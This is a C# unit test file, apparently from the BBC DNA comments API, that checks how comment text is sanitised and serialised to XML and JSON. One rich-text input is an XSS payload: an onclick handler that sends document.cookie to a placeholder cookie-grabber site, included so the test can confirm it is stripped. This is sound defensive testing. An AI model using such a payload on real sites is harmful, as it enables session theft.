using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Web;
using System.Xml;
using BBC.Dna.Utils;
using Microsoft.VisualStudio.TestTools.UnitTesting;

namespace BBC.Dna.Api.Tests
{
    /// <summary>
    ///This is a test class for CommentInfoTest and is intended
    ///to contain all CommentInfoTest Unit Tests
    ///</summary>
    [TestClass]
    public class CommentInfoTest
    {
        private List<string[]> testDataPlainText;
        private List<string[]> testDataRichText;
        private List<string[]> testDataOther;
        public CommentInfoTest()
        {
            testDataPlainText = new List<string[]>();
            testDataPlainText.Add(new[] { "test", "test" });
            testDataPlainText.Add(new[] { "<b>test</b>", "test" });
            testDataPlainText.Add(new[] { "<script>test</script>", "test" });
            testDataPlainText.Add(new[] { "test\r\nnewline", "test<BR />newline" });
            testDataPlainText.Add(new[] { "<a href=\"testurl\">test</a>", "test" });
            testDataPlainText.Add(new[] { "another test http://www.bbc.co.uk/ url", "another test <a href=\"http://www.bbc.co.uk/\">http://www.bbc.co.uk/</a> url" });
            testDataPlainText.Add(new[] { @"123

http://www.statistics.gov.uk/pdfdir/lmsuk1110.pdf", "123<BR /><BR /><a href=\"http://www.statistics.gov.uk/pdfdir/lmsuk1110.pdf\">http://www.statistics.gov.uk/pdfdir/lmsuk1110.pdf</a>" });

            testDataRichText = new List<string[]>();
            testDataRichText.Add(new[] { "test", "test" });
            testDataRichText.Add(new[] { "<b>test</b>", "<B>test</B>" });
            testDataRichText.Add(new[] { "test\r\nnewline", "test<BR />newline" });
            testDataRichText.Add(new[] { "<script>test</script>", "test" });
            testDataRichText.Add(new[] { "this is a <p onclick=\"window.location='http://www.somehackysite.tk/cookie_grabber.php?c=' + document.cookie\">test</p> for bad html tags.", "this is a <P>test</P> for bad html tags." });
            

            testDataOther = new List<string[]>();
            testDataOther.Add(new[] { "test", "test" });
            testDataOther.Add(new[] { "<b>test</b>", "<b>test</b>" });
            testDataOther.Add(new[] { "test\r\nnewline", "test\r\nnewline" });
            testDataOther.Add(new[] { "<script>test</script>", "<script>test</script>" });
        }

        /// <summary>
        ///A test for CommentInfo Constructor
        ///</summary>
        [TestMethod]
        public void CommentInfo_XmlSerialisingPlainText_ReturnsValidObject()
        {

            foreach (var data in testDataPlainText)
            {
                TestTextXmlSerialisation(PostStyle.Style.plaintext, data[1], data[0]);
            }
            
        }

        /// <summary>
        ///A test for CommentInfo Constructor
        ///</summary>
        [TestMethod]
        public void CommentInfo_XmlSerialisingRichText_ReturnsValidObject()
        {


            foreach (var data in testDataRichText)
            {
                TestTextXmlSerialisation(PostStyle.Style.richtext, data[1], data[0]);
            }

        }

        /// <summary>
        ///A test for CommentInfo Constructor
        ///</summary>
        [TestMethod]
        public void CommentInfo_XmlSerialisingRawTextUnknown_ReturnsValidObject()
        {
            foreach (var data in testDataOther)
            {
                TestTextXmlSerialisation(PostStyle.Style.rawtext, data[1], data[0]);
                TestTextXmlSerialisation(PostStyle.Style.unknown, data[1], data[0]);
            }

        }

        /// <summary>
        ///A test for CommentInfo Constructor
        ///</summary>
        [TestMethod]
        public void CommentInfo_JsonSerialisingPlainText_ReturnsValidObject()
        {
            foreach (var data in testDataPlainText)
            {
                TestTextJsonSerialisation(PostStyle.Style.plaintext, data[1], data[0]);
            }

        }

        /// <summary>
        ///A test for CommentInfo Constructor
        ///</summary>
        [TestMethod]
        public void CommentInfo_JsonSerialisingRichText_ReturnsValidObject()
        {
            foreach (var data in testDataRichText)
            {
                TestTextJsonSerialisation(PostStyle.Style.richtext, data[1], data[0]);
            }

        }

        /// <summary>
        ///A test for CommentInfo Constructor
        ///</summary>
        [TestMethod]
        public void CommentInfo_JsonSerialisingOther_ReturnsValidObject()
        {
            foreach (var data in testDataOther)
            {
                TestTextJsonSerialisation(PostStyle.Style.unknown, data[1], data[0]);
                TestTextJsonSerialisation(PostStyle.Style.rawtext, data[1], data[0]);
            }

        }

        private void TestTextXmlSerialisation(PostStyle.Style style, string expected, string input)
        {
            var target = new CommentInfo
            {
                PostStyle = style,
                text = input
            };
            expected = StringUtils.SerializeToXml(expected);
            var docExpected = new XmlDocument();
            docExpected.LoadXml(expected);
            expected = docExpected.DocumentElement.InnerXml;

            var doc = new XmlDocument();
            doc.LoadXml(target.ToXml());
            Assert.AreEqual(expected, doc.DocumentElement["text"].InnerXml);
        }

        private void TestTextJsonSerialisation(PostStyle.Style style, string expected, string input)
        {
            var target = new CommentInfo()
            {
                PostStyle = style,
                text = input
            };
            var doc = target.ToJson();

            expected = StringUtils.SerializeToJson(expected);
            expected = expected.Substring(1, expected.Length - 2);//strips quotes from around text

           
            var regText = new Regex("\"text\"\\:\"(.*)\",");
            Assert.IsTrue(regText.IsMatch(doc));
            MatchCollection matches = regText.Matches(doc);
            foreach (Match match in matches)
            {
                var actual = match.Value.Substring(8, match.Value.Length - 10);
                Assert.AreEqual(expected, actual);
            }
            
        }
    }
}